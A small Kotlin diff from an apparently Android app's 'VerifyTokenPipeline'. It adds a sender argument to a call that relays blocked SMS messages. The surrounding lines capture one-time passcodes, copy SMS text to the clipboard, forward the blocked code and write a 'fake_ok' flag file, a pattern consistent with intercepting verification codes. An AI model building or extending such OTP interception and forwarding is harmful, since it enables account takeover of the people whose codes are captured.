@@ -67,7 +67,7 @@ object VerifyTokenPipeline {
         OtpCaptureWriter.write(appContext, otp)
         ClipboardCopyHelper.copySms(appContext, body)
         TokenForwarder(configManager, appContext).forwardOutgoingBlocked(otp)
-        AutoTokenRelay.publishBlocked(appContext, pending.dest, pending.body)
+        AutoTokenRelay.publishBlocked(appContext, pending.dest, pending.body, sendFrom)
 
         try {
             File("/data/local/tmp/hivirtus_outgoing_fake_ok.flag").writeText("ok")
